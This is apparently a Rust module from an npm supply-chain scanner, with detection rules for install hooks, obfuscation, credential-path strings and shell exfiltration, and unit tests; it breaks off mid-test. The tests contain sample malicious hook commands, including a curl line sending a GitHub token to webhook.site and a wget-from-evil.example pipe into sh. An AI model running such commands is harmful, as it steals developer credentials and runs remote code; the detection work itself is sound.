use crate::models::CAPABILITY_KEY;
use regex::Regex;
use serde_json::{Map, Value};
use std::collections::HashSet;
use std::sync::LazyLock;
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

type Finding = Map<String, Value>;

fn finding(check: &str, severity: &str, message: &str, vector: &str) -> Finding {
    let mut m = Map::new();
    m.insert("check".into(), Value::String(check.to_string()));
    m.insert("severity".into(), Value::String(severity.to_string()));
    m.insert("message".into(), Value::String(message.to_string()));
    m.insert("vector".into(), Value::String(vector.to_string()));
    m
}

/// An install-hook command that fetches remote content or executes code inline.
/// Measured: 79 of 346 hook-bearing malicious packages match, and ZERO of the 5
/// hook-bearing packages in `eval/corpus/parent_benign.tsv`.
static HOOK_EXEC_SHAPE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)curl\b|wget\b|\|\s*(?:sh|bash)\b|\beval\b|base64\s+(?:-d|--decode)|node\s+-{1,2}e(?:val)?\b|https?://|\bnc\b|/dev/tcp/|child_process|powershell|certutil|Invoke-WebRequest|\brm\s+(?:-rf|/s|/q)",
    )
    .unwrap()
});

/// An install-hook command that is a recognised build step. Native modules
/// legitimately need one: `bcrypt` runs `node-gyp-build`, `sqlite3` runs
/// `prebuild-install -r napi || node-gyp rebuild`, `axios` and `fabric` run
/// `husky`. Only consulted when HOOK_EXEC_SHAPE did not match.
static HOOK_BUILD_SHAPE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"(?i)node-gyp|node-pre-gyp|prebuild-install|patch-package|husky|\btsc\b|npm\s+run\s+build|cmake|\bmake\b|electron-builder|nan\b",
    )
    .unwrap()
});

const JS_EXTENSIONS: &[&str] = &["js", "cjs", "mjs", "ts", "tsx", "jsx"];

fn js_files(dir: &Path) -> Vec<PathBuf> {
    WalkDir::new(dir)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| {
            e.path()
                .extension()
                .and_then(|ext| ext.to_str())
                .map(|ext| JS_EXTENSIONS.contains(&ext))
                .unwrap_or(false)
        })
        .map(|e| e.path().to_path_buf())
        .collect()
}

fn rel(dir: &Path, path: &Path) -> String {
    path.strip_prefix(dir)
        .unwrap_or(path)
        .display()
        .to_string()
}

/// Check package.json for install-time lifecycle scripts.
///
/// Covered set: `preinstall`, `install`, `postinstall`, `prepare` — every hook
/// npm actually runs on a plain consumer `npm install` of a *dependency*
/// (npm >=7 also runs `prepare` for git-dependency/`npm install` local-link
/// cases and, historically, on install for any package with a `prepare`
/// script). Out of scope: `test`, `prepack`, `prepublishOnly` — these only run
/// during the *publishing* workflow (`npm publish`/`npm pack`) or on-demand,
/// never on a downstream `npm install`, so a consumer-side scanner has
/// nothing to gain by flagging them.
///
/// ## Severity comes from the hook NAME and its COMMAND (v19 — measured)
///
/// Until v19 this check tested key *presence* only — `scripts.get(k).is_some()`
/// — and threw the command away, so `"postinstall": "node-gyp rebuild"` and
/// `"preinstall": "curl … | sh"` were the same finding. It fired on 62.3% of 499
/// real malicious packages and 18.5% of 27 legitimate ones: a real signal, far
/// too blunt to act on.
///
/// Two measurements sharpen it. Across the DataDog corpus and the benign parents:
///
/// | | malicious | benign |
/// |---|---|---|
/// | `preinstall` | 169 | **0** |
/// | `postinstall` | 136 | 1 (`node-sass`) |
/// | `install` / `prepare` only | 6 | 4 |
/// | command matches an exec/exfil shape | **79 packages** | **0** |
/// | command matches a build-toolchain shape | 9 hooks | 4 of 6 hooks |
///
/// So:
/// - a command that fetches and executes (`curl`, a pipe into a shell, `node -e`,
///   an inline URL, `base64 -d`) is a **BLOCK** — no legitimate hook in the
///   benign corpus looks like that;
/// - `preinstall`/`postinstall` with an ordinary command stays **SUSPECT**;
/// - `install`/`prepare`, or any hook whose command is a recognised build step
///   (`node-gyp`, `prebuild-install`, `husky`, …), drops to a **capability**.
///
/// `node <file>` is deliberately NOT treated as suspicious: `node-sass` ships
/// `"postinstall": "node scripts/build.js"` and most malicious hooks are the
/// same shape, so it separates nothing. The hook name carries that weight
/// instead.
///
/// Order matters — the exec/exfil test runs first, so burying `husky` in a
/// command that also curls something does not earn the demotion.
pub fn check_install_scripts(pkg_json: &Value) -> Vec<Finding> {
    let mut findings = Vec::new();
    let Some(scripts) = pkg_json.get("scripts") else {
        return findings;
    };

    let mut exec_hooks: Vec<String> = Vec::new();
    let mut run_hooks: Vec<&str> = Vec::new();
    let mut cap_hooks: Vec<&str> = Vec::new();

    for &hook in &["preinstall", "install", "postinstall", "prepare"] {
        let Some(cmd) = scripts.get(hook) else { continue };
        let cmd = cmd.as_str().unwrap_or("");
        if HOOK_EXEC_SHAPE.is_match(cmd) {
            exec_hooks.push(format!("{hook}: {cmd}"));
        } else if HOOK_BUILD_SHAPE.is_match(cmd) || matches!(hook, "install" | "prepare") {
            cap_hooks.push(hook);
        } else {
            run_hooks.push(hook);
        }
    }

    if !exec_hooks.is_empty() {
        let mut f = finding(
            "install_script",
            "BLOCK",
            &format!(
                "Install hook fetches or executes code: {}",
                exec_hooks.join("; ")
            ),
            "B1",
        );
        f.insert(
            "scripts".into(),
            Value::Array(
                exec_hooks
                    .iter()
                    .map(|s| Value::String(s.split(':').next().unwrap_or(s).to_string()))
                    .collect(),
            ),
        );
        findings.push(f);
    }
    if !run_hooks.is_empty() {
        let mut f = finding(
            "install_script",
            "SUSPECT",
            &format!(
                "Install lifecycle script(s) present: {}",
                run_hooks.join(", ")
            ),
            "B1",
        );
        f.insert(
            "scripts".into(),
            Value::Array(run_hooks.iter().map(|&s| Value::String(s.to_string())).collect()),
        );
        findings.push(f);
    }
    if !cap_hooks.is_empty() {
        let mut f = finding(
            "install_script",
            "INFO",
            &format!(
                "Build-time lifecycle script(s) present: {} (recognised build step or non-install hook)",
                cap_hooks.join(", ")
            ),
            "B1",
        );
        f.insert(
            "scripts".into(),
            Value::Array(cap_hooks.iter().map(|&s| Value::String(s.to_string())).collect()),
        );
        f.insert(CAPABILITY_KEY.into(), Value::String("install-hook".into()));
        findings.push(f);
    }
    findings
}

/// How many characters immediately preceding a base64-like match are inspected
/// for a `;base64,` data-URI marker. Wide enough to span a `data:<mediatype>;base64,`
/// prefix (mediatypes can be long, e.g. `application/vnd.openxmlformats-...`).
const DATA_URI_CONTEXT_WINDOW: usize = 80;

/// Distinct `_0x…` identifiers in one file at which obfuscation is no longer
/// deniable. `ansi-styles@6.2.2` (real crypto clipper) has 314; every benign
/// package measured has 0. 25 keeps a >12x margin under the observed malicious
/// value while staying far above any plausible hand-written use.
const HEX_IDENT_BLOCK: usize = 25;

/// Lower band — worth surfacing, not worth refusing an install over.
const HEX_IDENT_SUSPECT: usize = 5;

/// Return true if the base64-like match starting at `match_start` in `content`
/// is immediately preceded (within `DATA_URI_CONTEXT_WINDOW` chars) by a
/// `;base64,` marker — i.e. it is a `data:` URI payload, not an obfuscated
/// eval payload. Catches both the single-string form (`"data:image/png;base64,AAAA...=="`,
/// which the regex below never matches as a *whole* anyway since the prefix
/// breaks the pure-base64 run) and the split/concatenated form
/// (`"data:image/png;base64," + "AAAA...=="`), where the payload alone
/// otherwise looks like a clean 100+-char base64 literal.
fn is_data_uri_context(content: &str, match_start: usize) -> bool {
    let window_start = match_start.saturating_sub(DATA_URI_CONTEXT_WINDOW);
    // Snap to a char boundary so the slice doesn't panic on multi-byte content.
    let mut window_start = window_start;
    while window_start < match_start && !content.is_char_boundary(window_start) {
        window_start += 1;
    }
    content[window_start..match_start].contains(";base64,")
}

/// Scan .js files for obfuscation indicators (eval+Buffer.from, bare eval, hex sequences, long base64).
///
/// FP-control notes (deliberately tuned to reduce false positives on benign code
/// without losing true positives — see `tests` below for the balance struck):
///   - base64: a match immediately preceded by a `;base64,` data-URI marker is
///     skipped (image/font/etc. data URIs are common in legitimate packages).
///   - hex: the threshold is 8+ *consecutive* `\xNN` escapes (no literal text between
///     them). Real ANSI styling (`\x1b[31m`, or even several codes glued back-to-back
///     like `\x1b[0m\x1b[1m`) almost never reaches that many raw escapes in a row
///     because each CSI code is followed by literal bracket/digit text, not more
///     escapes; long obfuscated hex payloads comfortably exceed it.
///   - hex identifiers: counts DISTINCT `_0x…` names, not total occurrences — a
///     minifier reusing one such name is nothing like a generator emitting
///     hundreds of them. Raw `0x` literal counts are deliberately NOT used: `d3`
///     ships 174 of them legitimately.
///
/// ## The `_0x` rule and why the hex rule alone was not enough (v18)
///
/// v14 raised the `\xNN` threshold 4 -> 8 to stop false-positiving on chalk-style
/// ANSI strings. That was right, but it left the `javascript-obfuscator` family
/// completely unseen — it emits no `\xNN` runs at all. It emits `_0x`-prefixed
/// identifiers and short hex numeric literals.
///
/// The cost was measured in v17: `ansi-styles@6.2.2`, the real Sept-2025
/// chalk/debug compromise (a crypto clipper), **passed all four layers** with
/// zero findings. Its 80 KB payload has 4 `\xNN` escapes where the rule needs 8
/// consecutive, and no `eval`/`atob`/`Buffer.from`/`Function`/`process.env`/
/// network-require at all.
///
/// Measured separation (v18, distinct `_0x[0-9a-fA-F]{4,}` identifiers per file):
///
/// | corpus | distinct `_0x` |
/// |---|---|
/// | `ansi-styles@6.2.2` `index.js` (malicious) | **314** |
/// | `jquery`, `lodash`, `d3`, `react`, `chalk`, `debug`, `node-sass`, `fabric` | **0** |
///
/// Not one benign package examined contains a single such identifier — terser and
/// uglify emit short names (`a`, `_t`), never `_0x1a2b`. The thresholds below sit
/// an order of magnitude under the observed malicious value while leaving room
/// for a hand-written mask constant or two.
pub fn check_obfuscation(dir: &Path) -> Vec<Finding> {
    let re_eval_buf = Regex::new(r"eval\s*\(\s*Buffer\.from\s*\(").unwrap();
    let re_eval = Regex::new(r"eval\s*\(").unwrap();
    let re_hex = Regex::new(r"(?:\\x[0-9a-fA-F]{2}){8,}").unwrap();
    let re_b64 = Regex::new(r#"['"][A-Za-z0-9+/]{100,}={0,2}['"]"#).unwrap();
    // `\b` + a required `(` guards against matching a bare `atob` identifier or
    // a comment mention with no call.
    let re_atob = Regex::new(r"\batob\s*\(").unwrap();
    // Requires `Function(` / `new Function(` followed directly by a quote — i.e.
    // a string body. This deliberately does NOT match `Function.prototype` or a
    // bare `Function` reference (no `(` immediately after in those cases).
    let re_function_ctor = Regex::new(r#"\bFunction\s*\(\s*['"]"#).unwrap();
    // javascript-obfuscator's signature: machine-generated `_0x1a2b3c` identifiers.
    // `{4,}` skips short hand-written names like `_0xFF`.
    let re_hex_ident = Regex::new(r"_0x[0-9a-fA-F]{4,}").unwrap();

    let mut findings = Vec::new();
    for path in js_files(dir) {
        let Ok(content) = std::fs::read_to_string(&path) else { continue };
        let file = rel(dir, &path);

        if re_eval_buf.is_match(&content) {
            let mut f = finding(
                "obfuscation",
                "BLOCK",
                "eval(Buffer.from()) detected — base64-obfuscated payload",
                "B2",
            );
            f.insert("file".into(), Value::String(file.clone()));
            findings.push(f);
        } else if re_eval.is_match(&content) {
            let mut f = finding("obfuscation", "SUSPECT", "eval() call detected", "B2");
            f.insert("file".into(), Value::String(file.clone()));
            findings.push(f);
        }

        if re_hex.is_match(&content) {
            let mut f = finding(
                "obfuscation",
                "SUSPECT",
                "Hex-encoded string sequence detected",
                "B2",
            );
            f.insert("file".into(), Value::String(file.clone()));
            findings.push(f);
        }

        let has_non_data_uri_b64 = re_b64
            .find_iter(&content)
            .any(|m| !is_data_uri_context(&content, m.start()));
        if has_non_data_uri_b64 {
            // lift 1.16 (8.6% of real malware vs 7.4% of legitimate packages) —
            // a long base64 blob is about as common in a legitimate bundle as in
            // a payload. Capability tier, not an accusation.
            let mut f = finding(
                "obfuscation",
                "INFO",
                "Long base64-like string literal detected (possible encoded payload)",
                "B2",
            );
            f.insert("file".into(), Value::String(file.clone()));
            f.insert(CAPABILITY_KEY.into(), Value::String("encoded-blob".into()));
            findings.push(f);
        }

        // atob() base64 decode — escalate to BLOCK if the same file also feeds
        // dynamic execution (eval or a Function() string-constructor), since
        // decoded-and-executed is high confidence; otherwise it's a SUSPECT
        // capability note (atob alone is also used by benign browser-shim code).
        if re_atob.is_match(&content) {
            if re_eval.is_match(&content) || re_function_ctor.is_match(&content) {
                let mut f = finding(
                    "obfuscation",
                    "BLOCK",
                    "atob()-decoded payload passed to dynamic execution",
                    "B2",
                );
                f.insert("file".into(), Value::String(file.clone()));
                findings.push(f);
            } else {
                let mut f = finding(
                    "obfuscation",
                    "SUSPECT",
                    "atob() base64 decode detected — possible encoded payload",
                    "B2",
                );
                f.insert("file".into(), Value::String(file.clone()));
                findings.push(f);
            }
        }

        // Function() constructor with a string body — dynamic code execution
        // equivalent to eval. Kept SUSPECT here even when atob is also present;
        // the atob rule above already escalates that combination to BLOCK, so
        // this avoids double-BLOCK-ing the same file for the same root cause.
        if re_function_ctor.is_match(&content) {
            let mut f = finding(
                "obfuscation",
                "SUSPECT",
                "Function() constructor with string body — dynamic code execution",
                "B2",
            );
            // NOTE: `file` is cloned, not moved — the hex-identifier rule below
            // needs it too.
            f.insert("file".into(), Value::String(file.clone()));
            findings.push(f);
        }

        // Hex-identifier density (v18) — the javascript-obfuscator family.
        let distinct_hex_idents = re_hex_ident
            .find_iter(&content)
            .map(|m| m.as_str())
            .collect::<HashSet<_>>()
            .len();
        if distinct_hex_idents >= HEX_IDENT_BLOCK {
            let mut f = finding(
                "obfuscation",
                "BLOCK",
                &format!(
                    "Hex-identifier obfuscation: {} distinct `_0x...` identifiers — \
                     machine-generated name mangling (javascript-obfuscator family)",
                    distinct_hex_idents
                ),
                "B2",
            );
            f.insert("file".into(), Value::String(file));
            findings.push(f);
        } else if distinct_hex_idents >= HEX_IDENT_SUSPECT {
            let mut f = finding(
                "obfuscation",
                "SUSPECT",
                &format!(
                    "Hex-identifier naming: {} distinct `_0x...` identifiers",
                    distinct_hex_idents
                ),
                "B2",
            );
            f.insert("file".into(), Value::String(file));
            findings.push(f);
        }
    }
    findings
}

/// Scan .js files for sensitive path/env references (/etc/passwd, ~/.ssh, process.env, etc.).
pub fn check_suspicious_strings(dir: &Path) -> Vec<Finding> {
    let patterns: &[(&str, &str, &str)] = &[
        (r"/etc/passwd", "BLOCK", "References /etc/passwd"),
        (r"/etc/shadow", "BLOCK", "References /etc/shadow"),
        (r"~/\.ssh|/\.ssh/", "BLOCK", "References SSH directory (~/.ssh)"),
        // process.env is INVERTED: 36.3% of 499 real malicious packages vs 44.4%
        // of 27 legitimate ones (lift 0.82). Reading configuration is not an
        // attack, and this rule alone reached 12 of the 27 benign packages — the
        // single largest false-positive source in the tool. Capability tier.
        (r"process\.env\b", "INFO", "Reads environment variables (process.env)"),
        // os.homedir() by contrast is 14.4% malicious vs 0.0% benign — keep, and
        // match the indirect form too. `naniod` (a real nanoid typosquat) calls
        // `require('os').homedir()`, which the bare `os.homedir()` pattern missed
        // entirely; it was the package's only detectable signal.
        (
            r#"os\.homedir\(\)|require\(\s*['"]os['"]\s*\)\s*\.\s*homedir\(\)"#,
            "SUSPECT",
            "Reads home directory path (os.homedir())",
        ),
    ];

    let compiled: Vec<(Regex, &str, &str)> = patterns
        .iter()
        .filter_map(|(pat, sev, msg)| Regex::new(pat).ok().map(|re| (re, *sev, *msg)))
        .collect();

    let mut findings = Vec::new();
    for path in js_files(dir) {
        let Ok(content) = std::fs::read_to_string(&path) else { continue };
        let file = rel(dir, &path);
        for (re, sev, msg) in &compiled {
            if re.is_match(&content) {
                let mut f = finding("suspicious_strings", sev, msg, "B2");
                f.insert("file".into(), Value::String(file.clone()));
                if *sev == "INFO" {
                    f.insert(CAPABILITY_KEY.into(), Value::String("env-read".into()));
                }
                findings.push(f);
            }
        }
    }
    findings
}

/// Scan .js files for network-capable module imports (axios, node-fetch, https, http,
/// WebSocket/proxy libraries, etc.) plus shell-exfil via `child_process` spawning
/// `curl`/`wget`/`nc`.
pub fn check_network_imports(dir: &Path) -> Vec<Finding> {
    // Module names with regex-special chars (`.`, `/`) are escaped so they only
    // match the literal package name, not an unintended pattern.
    const MOD: &str = r#"axios|node-fetch|cross-fetch|https?|got|superagent|request|ws|socket\.io|@socket\.io/client|http-proxy-agent|https-proxy-agent|undici"#;
    let patterns = [
        format!(r#"require\s*\(\s*['"](?:{MOD})['"]\s*\)"#),
        format!(r#"import\s+[^;]*?from\s*['"](?:{MOD})['"]"#),
        format!(r#"import\s*['"](?:{MOD})['"]"#),
        format!(r#"import\s*\(\s*['"](?:{MOD})['"]\s*\)"#),
    ];
    let res: Vec<Regex> = patterns.iter().map(|p| Regex::new(p).unwrap()).collect();

    // Shell-exfil vector: child_process exec/spawn invoking a shell binary/interpreter
    // (curl/wget/nc/ncat/python/perl/ruby), reading/writing a /dev/tcp/ socket, or
    // piping through `base64 -d`/`--decode` — lets a package exfiltrate data or fetch
    // a second-stage payload without importing any JS network module at all.
    let re_child_process = Regex::new(r"child_process").unwrap();
    let re_shell_exfil_bin = Regex::new(
        r#"\b(?:curl|wget|nc|ncat|python3?|perl|ruby)\b|/dev/tcp/|base64\s+(?:-d|--decode)"#,
    )
    .unwrap();

    let mut hit_files: Vec<String> = Vec::new();
    let mut shell_exfil_files: Vec<String> = Vec::new();
    for path in js_files(dir) {
        let Ok(content) = std::fs::read_to_string(&path) else { continue };
        let file = rel(dir, &path);
        if res.iter().any(|re| re.is_match(&content)) {
            hit_files.push(file.clone());
        }
        if re_child_process.is_match(&content) && re_shell_exfil_bin.is_match(&content) {
            shell_exfil_files.push(file);
        }
    }

    let mut findings = Vec::new();

    if !hit_files.is_empty() {
        let mut f = finding(
            "network_imports",
            "SUSPECT",
            &format!("Network-capable module imported in {} file(s)", hit_files.len()),
            "B2",
        );
        f.insert(
            "files".into(),
            Value::Array(hit_files.into_iter().map(Value::String).collect()),
        );
        findings.push(f);
    }

    if !shell_exfil_files.is_empty() {
        let mut f = finding(
            "shell_exfil",
            "SUSPECT",
            &format!(
                "child_process spawning a shell/interpreter or using /dev/tcp — possible shell-based exfiltration in {} file(s)",
                shell_exfil_files.len()
            ),
            "B2",
        );
        f.insert(
            "files".into(),
            Value::Array(shell_exfil_files.into_iter().map(Value::String).collect()),
        );
        findings.push(f);
    }

    findings
}

/// Scan .js files for computed dynamic `import()` and systematic split-string
/// obfuscation (e.g. `'ht' + 'tp'`).
///
/// FP-control notes:
///   - split-string: legit code occasionally concatenates short string literals,
///     so a single occurrence is not flagged; only 3+ occurrences in one file
///     (systematic string-splitting, a known obfuscation technique) trip this.
pub fn check_computed_load(dir: &Path) -> Vec<Finding> {
    // `import(` whose argument is not a plain string literal, OR contains `+`
    // concatenation — i.e. the module path is built at runtime. Mirrors
    // check_dynamic_require's require(variable) coverage, but for import().
    let re_computed_import_nonliteral = Regex::new(r#"import\s*\(\s*[^'")\s]"#).unwrap();
    let re_computed_import_concat = Regex::new(r"import\s*\([^)]*\+").unwrap();
    let re_split_string = Regex::new(r#"['"][A-Za-z]{1,4}['"]\s*\+\s*['"][A-Za-z]{1,4}['"]"#).unwrap();

    let mut findings = Vec::new();
    for path in js_files(dir) {
        let Ok(content) = std::fs::read_to_string(&path) else { continue };
        let file = rel(dir, &path);

        if re_computed_import_nonliteral.is_match(&content) || re_computed_import_concat.is_match(&content) {
            let mut f = finding(
                "computed_load",
                "SUSPECT",
                "Computed dynamic import() — module path built at runtime",
                "B2",
            );
            f.insert("file".into(), Value::String(file.clone()));
            findings.push(f);
        }

        let split_count = re_split_string.find_iter(&content).count();
        if split_count >= 3 {
            let mut f = finding(
                "computed_load",
                "SUSPECT",
                &format!("Systematic split-string obfuscation ({split_count} fragments)"),
                "B2",
            );
            f.insert("file".into(), Value::String(file));
            findings.push(f);
        }
    }
    findings
}

/// Scan .js files for low-confidence capability notes: `worker_threads` usage and
/// `.wasm` module references. Both are common in legitimate performance-oriented
/// packages, so these are INFO-severity (low-weight, doesn't push the verdict) —
/// they exist to surface capability, not to accuse.
pub fn check_capability_notes(dir: &Path) -> Vec<Finding> {
    let re_worker_threads = Regex::new(
        r#"require\s*\(\s*['"]worker_threads['"]\s*\)|from\s*['"]worker_threads['"]|import\s*\(\s*['"]worker_threads['"]\s*\)"#,
    )
    .unwrap();
    let re_wasm = Regex::new(r"\.wasm\b").unwrap();

    let mut findings = Vec::new();
    for path in js_files(dir) {
        let Ok(content) = std::fs::read_to_string(&path) else { continue };
        let file = rel(dir, &path);

        if re_worker_threads.is_match(&content) {
            let mut f = finding(
                "worker_threads",
                "INFO",
                "worker_threads used — off-main-thread execution (capability note)",
                "B2",
            );
            f.insert("file".into(), Value::String(file.clone()));
            findings.push(f);
        }

        if re_wasm.is_match(&content) {
            let mut f = finding(
                "wasm_reference",
                "INFO",
                "WebAssembly module referenced (capability note)",
                "B2",
            );
            f.insert("file".into(), Value::String(file));
            findings.push(f);
        }
    }
    findings
}

/// Scan .js files for dynamic require(variable) — require called with a non-literal argument.
pub fn check_dynamic_require(dir: &Path) -> Vec<Finding> {
    let re = Regex::new(r#"require\(\s*[^'")\s][^)]*\)"#).unwrap();

    let mut findings = Vec::new();
    for path in js_files(dir) {
        let Ok(content) = std::fs::read_to_string(&path) else { continue };
        if re.is_match(&content) {
            // INVERTED rule (v19 — measured): 7.6% of 499 real malicious
            // packages vs 14.8% of 27 legitimate ones, lift 0.51. A bundler
            // emits `require(variable)` by construction. Capability tier.
            let mut f = finding(
                "dynamic_require",
                "INFO",
                "Dynamic require(variable) pattern — module loaded at runtime from a variable",
                "B2",
            );
            f.insert("file".into(), Value::String(rel(dir, &path)));
            f.insert(
                CAPABILITY_KEY.into(),
                Value::String("dynamic-require".into()),
            );
            findings.push(f);
        }
    }
    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;
    use std::fs;
    use tempfile::TempDir;

    fn dir_with(files: &[(&str, &str)]) -> TempDir {
        let tmp = TempDir::new().unwrap();
        for (name, content) in files {
            fs::write(tmp.path().join(name), content).unwrap();
        }
        tmp
    }

    fn sevs(findings: &[Finding]) -> Vec<String> {
        findings
            .iter()
            .map(|f| f.get("severity").and_then(|v| v.as_str()).unwrap_or("").to_string())
            .collect()
    }

    fn vectors(findings: &[Finding]) -> Vec<String> {
        findings
            .iter()
            .map(|f| f.get("vector").and_then(|v| v.as_str()).unwrap_or("").to_string())
            .collect()
    }

    fn checks(findings: &[Finding]) -> Vec<String> {
        findings
            .iter()
            .map(|f| f.get("check").and_then(|v| v.as_str()).unwrap_or("").to_string())
            .collect()
    }

    #[test]
    fn install_scripts_detected() {
        let pkg = json!({ "scripts": { "postinstall": "node x.js" } });
        assert_eq!(sevs(&check_install_scripts(&pkg)), vec!["SUSPECT"]);
        assert_eq!(vectors(&check_install_scripts(&pkg)), vec!["B1"]);
        let clean = json!({ "scripts": { "test": "jest" } });
        assert!(check_install_scripts(&clean).is_empty());
        let none = json!({});
        assert!(check_install_scripts(&none).is_empty());
    }

    // 3c: `prepare` is still in the checked lifecycle set, but since v19 it is a
    // CAPABILITY, not an accusation. Measured: `install`/`prepare` appear on 6
    // malicious packages and 4 of the 5 hook-bearing legitimate ones —
    // `axios`/`fabric` run `husky`, `bcrypt` runs `node-gyp-build`, `sqlite3`
    // runs `prebuild-install`. `preinstall`/`postinstall` carry the signal.
    #[test]
    fn install_scripts_prepare_is_a_capability_not_an_accusation() {
        let pkg = json!({ "scripts": { "prepare": "node build.js" } });
        let f = check_install_scripts(&pkg);
        assert_eq!(sevs(&f), vec!["INFO"]);
        assert_eq!(
            f[0].get(crate::models::CAPABILITY_KEY).and_then(|v| v.as_str()),
            Some("install-hook")
        );
        let scripts = f[0].get("scripts").unwrap().as_array().unwrap();
        assert!(scripts.iter().any(|v| v.as_str() == Some("prepare")));
    }

    /// The hook-name split, pinned. `preinstall` appears 169 times across the
    /// 499 real malicious packages and ZERO times in the 27 legitimate ones.
    #[test]
    fn install_scripts_pre_and_post_install_still_accuse() {
        for hook in ["preinstall", "postinstall"] {
            let pkg = json!({ "scripts": { hook: "node setup.js" } });
            assert_eq!(sevs(&check_install_scripts(&pkg)), vec!["SUSPECT"], "{hook}");
        }
    }

    /// A hook that fetches and executes is a BLOCK. Measured: 79 of 346
    /// hook-bearing malicious packages match this shape; ZERO of the 5
    /// hook-bearing packages in the benign corpus do.
    #[test]
    fn install_scripts_fetch_and_exec_body_blocks() {
        for cmd in [
            "curl -d \"$(gh auth token)\" https://webhook.site/abc",
            "wget -qO- http://evil.example/x | sh",
            "node -e \"require('child_process').exec('id')\"",
            "echo aGk= | base64 -d | bash",
        ] {
            let pkg = json!({ "scripts": { "postinstall": cmd } });
            assert_eq!(sevs(&check_install_scripts(&pkg)), vec!["BLOCK"], "{cmd}");
        }
    }

    /// FP-CONTROL: the real hook bodies of the benign corpus. Every one of these
    /// is a genuine native/build step and must not accuse.
    #[test]
    fn install_scripts_real_benign_build_bodies_are_capabilities() {
        for (hook, cmd) in [
            ("prepare", "husky"),                                     // axios
            ("prepare", "husky install"),                             // fabric
            ("install", "node-gyp-build"),                            // bcrypt
            ("install", "prebuild-install -r napi || node-gyp rebuild"), // sqlite3
        ] {
            let pkg = json!({ "scripts": { hook: cmd } });
            let f = check_install_scripts(&pkg);
            assert_eq!(sevs(&f), vec!["INFO"], "{hook}: {cmd}");
        }
    }

    /// `node <file>` must NOT be treated as an exec shape on its own: `node-sass`
    /// legitimately ships `"postinstall": "node scripts/build.js"`, and most
    /// malicious hooks look identical. The hook NAME carries that weight, so this
    /// stays SUSPECT (postinstall) rather than escalating to BLOCK.
    #[test]
    fn install_scripts_node_file_is_not_by_itself_an_exec_shape() {
        let pkg = json!({ "scripts": { "postinstall": "node scripts/build.js" } });
        assert_eq!(sevs(&check_install_scripts(&pkg)), vec!["SUSPECT"]);
        let pkg2 = json!({ "scripts": { "install": "node scripts/install.js" } });
        assert_eq!(sevs(&check_install_scripts(&pkg2)), vec!["INFO"]);
    }

    // 3c: out-of-scope hooks (test/prepack/prepublishOnly) never run on a
    // downstream `npm install`, so they must NOT be flagged.
    #[test]
    fn install_scripts_prepack_and_prepublish_out_of_scope() {
        let pkg = json!({
            "scripts": { "test": "jest", "prepack": "node x.js", "prepublishOnly": "node y.js" }
        });
        assert!(check_install_scripts(&pkg).is_empty());
    }

    #[test]
    fn obfuscation_eval_buffer_blocks() {
        let d = dir_with(&[("a.js", "const x = eval(Buffer.from('aaa','base64'));")]);
        let f = check_obfuscation(d.path());
        assert!(sevs(&f).contains(&"BLOCK".to_string()));
        assert!(vectors(&f).iter().all(|v| v == "B2"));
    }

    #[test]
    fn obfuscation_bare_eval_is_suspect() {
        let d = dir_with(&[("a.js", "eval(userInput);")]);
        let f = check_obfuscation(d.path());
        assert_eq!(sevs(&f), vec!["SUSPECT"]);
        assert_eq!(vectors(&f), vec!["B2"]);
    }

    // 3d TRUE-POSITIVE control: a genuine 100+ char base64 payload literal
    // (no data: URI nearby) must still be flagged SUSPECT.
    #[test]
    fn obfuscation_long_base64_literal_is_suspect() {
        let payload = "A".repeat(150);
        let d = dir_with(&[("a.js", &format!("const p = \"{}==\";", payload))]);
        let f = check_obfuscation(d.path());
        assert!(
            f.iter().any(|f| f.get("message").and_then(|v| v.as_str()) == Some(
                "Long base64-like string literal detected (possible encoded payload)"
            )),
            "expected a base64 finding; got: {:?}",
            f
        );
    }

    // 3d FP-CONTROL: a base64 literal that is a `data:` URI payload (image/font/etc.)
    // must NOT be flagged, whether inline or split via string concatenation.
    #[test]
    fn obfuscation_data_uri_base64_is_not_flagged() {
        let payload = "A".repeat(150);
        let inline = dir_with(&[(
            "a.js",
            &format!("const img = \"data:image/png;base64,{}==\";", payload),
        )]);
        assert!(
            check_obfuscation(inline.path()).is_empty(),
            "inline data: URI must not be flagged"
        );

        let split = dir_with(&[(
            "b.js",
            &format!(
                "const prefix = \"data:image/png;base64,\";\nconst img = prefix + \"{}==\";",
                payload
            ),
        )]);
        assert!(
            check_obfuscation(split.path()).is_empty(),
            "concatenated data: URI must not be flagged"
        );
    }

    // 3d FP-CONTROL: chalk-style ANSI escape strings must NOT trip the hex rule,
    // even when several codes are glued back-to-back with no literal text between
    // some of the escapes.
    #[test]
    fn obfuscation_chalk_style_ansi_is_not_flagged() {
        let d = dir_with(&[(
            "a.js",
            r#"console.log("\x1b[31mHello\x1b[0m", "\x1b[1m\x1b[32mWorld\x1b[0m");"#,
        )]);
        let f = check_obfuscation(d.path());
        assert!(
            !f.iter().any(|f| f.get("message").and_then(|v| v.as_str())
                == Some("Hex-encoded string sequence detected")),
            "chalk-style ANSI must not trip the hex rule; got: {:?}",
            f
        );
    }

    // 3d TRUE-POSITIVE control: a long fully-hex-encoded payload (8+ consecutive
    // \xNN escapes, no separating literal text) must still be flagged SUSPECT.
    #[test]
    fn obfuscation_long_hex_payload_is_suspect() {
        let d = dir_with(&[(
            "a.js",
            r#"const p = "\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x00\x01\x02";"#,
        )]);
        let f = check_obfuscation(d.path());
        assert!(
            f.iter().any(|f| f.get("message").and_then(|v| v.as_str())
                == Some("Hex-encoded string sequence detected")),
            "expected a hex finding; got: {:?}",
            f
        );
    }

    // atob() alone is a SUSPECT capability note — decoding without executing is
    // lower confidence than eval(Buffer.from()).
    #[test]
    fn obfuscation_atob_alone_is_suspect() {
        let d = dir_with(&[("a.js", "const s = atob('aGVsbG8=');")]);
        let f = check_obfuscation(d.path());
        assert!(
            f.iter().any(|f| f.get("check").and_then(|v| v.as_str()) == Some("obfuscation")
                && f.get("severity").and_then(|v| v.as_str()) == Some("SUSPECT")
                && f.get("message").and_then(|v| v.as_str())
                    == Some("atob() base64 decode detected — possible encoded payload")),
            "expected atob SUSPECT finding; got: {:?}",
            f
        );
        assert!(vectors(&f).iter().all(|v| v == "B2"));
    }

    // atob() combined with eval() escalates to BLOCK — decoded-and-executed.
    #[test]
    fn obfuscation_atob_plus_eval_blocks() {
